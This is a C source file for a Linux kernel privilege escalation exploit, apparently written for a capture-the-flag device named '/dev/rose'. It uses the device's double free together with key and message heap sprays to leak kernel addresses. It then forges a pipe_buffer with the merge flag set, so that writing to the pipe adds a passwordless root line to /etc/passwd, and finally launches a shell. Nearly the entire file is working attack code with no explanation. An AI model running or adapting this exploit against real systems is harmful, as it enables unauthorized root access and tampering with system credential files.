#define _GNU_SOURCE
#include <bits/types/struct_itimerspec.h>
#include <bits/time.h>
#include <sys/timerfd.h>
#include <stddef.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <netinet/in.h>
#include <sched.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <linux/userfaultfd.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <limits.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <linux/keyctl.h>
#include <sys/shm.h>
#include <ctype.h>

#define DATA_SIZE 0x400
#define NUMBER_FDS 0x10
#define MSG_SIZE 0x2e0
#define HEXDUMP_COLS 16

#define KEY_DESC_MAX_SIZE 512
#define PREFIX_BUF_LEN 16
#define RCU_HEAD_LEN 16
#define SPRAY_KEY_SIZE 10
#define PIPE_SPRAY_SIZE 16
#define PIPE_DATA_SIZE 0x300

char * filepath = "/dev/rose\0";
int rfds[NUMBER_FDS];
int uffd;
pthread_t thr1;

struct uffdio_api uffdio_api;
struct uffdio_register uffdio_register;

struct msg{
    long mtype;
    char mtext[MSG_SIZE];
};

struct keyring_payload {
    uint8_t prefix[PREFIX_BUF_LEN];
    uint8_t rcu_buf[RCU_HEAD_LEN];
    unsigned short len;
};

struct pipe_buffer {
    uint64_t page;
    uint32_t offset;
    uint32_t len;
    uint64_t ops;
    uint32_t flags;
    uint32_t pad;
    uint64_t private;
};

struct pipe_buf_operations {
  uint64_t confirm;
  uint64_t release;
  uint64_t steal;
  uint64_t get;
};

struct leak {
    long vmemmap_addr;
    long pipe_buf_operations;
} leaks;

typedef int32_t key_serial_t;

void err_log(char * string){
    printf("[X] %s\n", string); 
    exit(1);
}

void info_log(char * message){
    printf("[*] %s\n", message);
    return;
}

void hexdump(void *mem, unsigned int len)
{
    unsigned int i, j;
    for(i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
    {
        if(i % HEXDUMP_COLS == 0)
        {
            printf("0x%06x: ", i);
        }
        if(i < len)
        {
            printf("%02x ", 0xFF & ((char*)mem)[i]);
        }
        else /* end of block, just aligning for ASCII dump */
        {
            printf("   ");
        }
        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
        {
            for(j = i - (HEXDUMP_COLS - 1); j <= i; j++)
            {
                if(j >= len) /* end of block, not really printing */
                {
                    putchar(' ');
                }
                else if(isprint(((char*)mem)[j])) /* printable char */
                {
                    putchar(0xFF & ((char*)mem)[j]);        
                }
                else /* other char */
                {
                    putchar('.');
                }
            }
            putchar('\n');
        }
    }
}


static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid) {
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) {
    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}

void errout(char *msg)
{
    perror(msg);
    exit(-1);
}

/**
 * spray_keyring(): Spray the heap with `user_key_payload` structure
 * @spray_size: Number of object to put into the `kmalloc-64` cache
 *
 * Return: Allocated buffer with serial numbers of the created keys
 */
key_serial_t *spray_keyring(uint32_t spray_size) {

    char key_desc[KEY_DESC_MAX_SIZE]; // spray size = KEY_DESC_MAX_SIZE+0x18
    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));

    if (id_buffer == NULL)
        errout("calloc");

    for (uint32_t i = 0; i < spray_size; i++) {
        snprintf(key_desc, KEY_DESC_MAX_SIZE, "lanleft-%03du", i);
        id_buffer[i] = add_key("user", key_desc, key_desc, KEY_DESC_MAX_SIZE, KEY_SPEC_PROCESS_KEYRING);
        if (id_buffer[i] < 0)
            errout("add_key");
    }

    return id_buffer;
}

/**
 * parse_leak(): Parse the infoleak to compute the kaslr base and the physmap base
 * @buffer: Buffer that contains the infoleak
 * @buffer_size: Size of the previous buffer
 *
 * Return: KASLR base and physmap base of the running kernel
 */
void parse_leak(uint64_t *buffer, uint32_t buffer_size) {

    struct leak *ret = malloc(sizeof(struct leak));
    if (!ret)
        errout("malloc");

    for (uint32_t i = 0; i < buffer_size; i++) {
        //if(buffer[i] != 0) printf("[*] leak at %d: 0x%lx\n", i, buffer[i]);
        if((buffer[i] & 0x0000000000000FFF) == 0x420){
            leaks.pipe_buf_operations = buffer[i];
            leaks.vmemmap_addr = buffer[i-2];
            break;
        }
        /* Search for reference to the function io_ring_ctx_ref_free */
        //if ((buffer[i] & 0xfffff) == (KADDR_OFFSET & 0xfffff)) {
        //    ret->kaslr_base = buffer[i] - KADDR_OFFSET;
        //    ret->physmap_base = 0;
        //    return ret;
        //}
    }

    free(ret);
    return;
}


/**
 * get_keyring_leak(): Find the infoleak and compute the needed bases
 * @id_buffer: Buffer with the serial numbers of keys used to spray the heap
 * @id_buffer_size: Size of the previous buffer
 *
 * Search for a key with an unexpected size to find the corrupted object.
 *
 * Return: KASLR base and physmap base of the running kernel
 */
void get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size) {
    
    uint8_t buffer[USHRT_MAX] = {0};
    int32_t keylen;

    for (uint32_t i = 0; i < id_buffer_size; i++) {
        printf("[*] attempting to leak at id buffer %d\n", i);

        keylen = keyctl(KEYCTL_READ, id_buffer[i], (long)buffer, USHRT_MAX, 0);
        if (keylen < 0)
            errout("keyctl");

        printf("[*] keylength of %d\n", i);
        parse_leak((uint64_t *)buffer, keylen >> 3);
    }
    return;
}

/**
 * release_keys(): Release user_key_payload objects
 * @id_buffer: Buffer that stores the id of the key to remove
 * @id_buffer_size: Size of the previous buffer
 */
void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size) {
    
    puts("[+] release_keys");
    for (uint32_t i = 0; i < id_buffer_size; i++) {
        if (keyctl(KEYCTL_REVOKE, id_buffer[i], 0, 0, 0) < 0)
            errout("keyctl(KEYCTL_REVOKE)");
    }

    free(id_buffer);
}

int open_device(){
    int fd;
    fd = open(filepath, O_RDWR);
    return fd;
}

int send_message(char msg_fill, uint64_t msg_type){
    struct msg to_send;
    int qid;
    to_send.mtype = msg_type;
    memset(to_send.mtext, msg_fill, MSG_SIZE);

    qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if(msgsnd(qid, &to_send, sizeof(to_send.mtext), 0) == -1) err_log("msgsnd");
    return qid; 
}

void fill_queue(int msg_queue, char *msg_text, uint32_t msg_len, uint64_t msg_type){
    struct msg to_send;
    to_send.mtype = msg_type + 2;
    memset(to_send.mtext, 0, MSG_SIZE);
    mempcpy(to_send.mtext, msg_text, msg_len);

    if(msgsnd(msg_queue, &to_send, sizeof(to_send.mtext), 0) == -1) err_log("msgsnd");
    return; 
}

void recv_mesgage(int qid, uint print_res){
    struct msg recieved_message;
    recieved_message.mtype = 1;
    memset(recieved_message.mtext, 0, MSG_SIZE);
    //printf("[*] qid %d\n", qid);
    if(msgrcv(qid, &recieved_message, MSG_SIZE, 0, IPC_NOWAIT | MSG_NOERROR) == -1) printf("[X] error msgrcv errno: 0x%x\n", errno);
    if(print_res) hexdump(recieved_message.mtext, MSG_SIZE); 
}

int main(void){
    int qid[0x100];
    int tty_id;
    key_serial_t *id_buffer;
    int pipes[PIPE_SPRAY_SIZE][2];
    char tmp[0x1000]; 
    int passwd_fd;
    struct msg overwrite;

    struct pipe_buffer pipe_buf;

    char *name = malloc(0x310);
    memset(name, 'B', 0x300);
    info_log("openning devices");
    passwd_fd = open("/etc/passwd", O_RDONLY);
    //rfds[0] = open_device();
    rfds[1] = open_device();
    rfds[2] = open_device();

    //populate the initial cache with a bunch of messages

    info_log("freeing once");
    close(rfds[2]);

    info_log("spray a keyring");
    id_buffer = spray_keyring(1);


    info_log("attempting to free sprayed message");
    close(rfds[1]);

    info_log("overwrite the basics of the key struct with a message struct");
    qid[0] = send_message('B', 0x8000);

    //spray some pipes onto the stack to find them later
    info_log("spray_pipes");
    off_t offset = 1;
    memset(tmp, 'A', 0x1000);
    if(pipe(pipes[0]) < -1) err_log("pipe"); 
    if(write(pipes[0][1], tmp, 0x1000) < 0) err_log("write to pipe");
    if(write(pipes[0][1], tmp, 0x1000) < 0) err_log("write to pipe");
    if(splice(passwd_fd, &offset, pipes[0][1], NULL, 1, 0) < 0) err_log("splice");

    info_log("get_leaks");
    get_keyring_leak(id_buffer, 1);

    assert(leaks.vmemmap_addr != 0 && leaks.pipe_buf_operations != 0);
    printf("[!] vmemmap_addr: 0x%lx\n[!] pipe_buf_operations: 0x%lx\n", leaks.vmemmap_addr, leaks.pipe_buf_operations);

    //for(uint32_t i = 0; i < PIPE_SPRAY_SIZE; i++)
    //    if(read(pipes[i][0], tmp, PIPE_DATA_SIZE) < 0) err_log("read from pipe");

    //close(rfds[0]);


    //reset the heap by fixing the freelist
    rfds[0] = open_device();
    //recv_mesgage(qid[0], 0);
    rfds[1] = open_device();
    rfds[2] = open_device();
    //release_keys(id_buffer, 1);
    rfds[3] = open_device();
    //rfds[4] = open_device();
    //for(uint i = 0; i < 0xf; i++)
    //    recv_mesgage(qid[i+1], 0);
    //
    puts("break to attach debugger");
    getchar();
    close(rfds[3]);
    pipe(pipes[1]);
    if(write(pipes[1][1], tmp, 0x1000) < 0) err_log("pipe write");
    if(write(pipes[1][1], tmp, 0x1000) < 0) err_log("pipe write");
    if(splice(passwd_fd, &offset, pipes[1][1], NULL, 1, 0) < 0) err_log("splice");

    info_log("new pipe created");
    close(rfds[2]);

    pipe_buf.page = leaks.vmemmap_addr;
    pipe_buf.offset = 0;
    pipe_buf.len = 0;
    pipe_buf.ops = leaks.pipe_buf_operations;
    pipe_buf.flags = 0x10; //PIPE_BUF_FLAGS_CAN_MERGE
    pipe_buf.pad = 0; 
    pipe_buf.private = 0; 

    overwrite.mtype = 1;
    memset(overwrite.mtext, 0, MSG_SIZE);
    memcpy((overwrite.mtext)+0x20, &pipe_buf, sizeof(struct pipe_buffer));

    qid[1] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if(msgsnd(qid[1], &overwrite, sizeof(overwrite.mtext), 0) == -1) err_log("msgsnd");

    //trigger breakpoint
    //close(rfds[1]);
    write(pipes[1][1], "root::0:0::/root:/bin/sh\n", 25);
    
    puts("done, enter to crash");
    getchar();

    system("sh");

    return 0;
}
//for(int i = 0; i < 0x10; i++) tty_id = open("/dev/ptmx", O_RDWR | O_NOCTTY); if(setxattr("./","user.exp", name, 0x300, 0) == -1) printf("[X] setxattr errno: %d\n", errno); if(pipe(pipefd) < -1) err_log("pipe"); if(write(pipefd[1], name, 0x300) < 0) err_log("write to pipe"); if(socket(AF_UNIX, SOCK_RAW | SOCK_NONBLOCK, 0) == -1) err_log("socket"); 
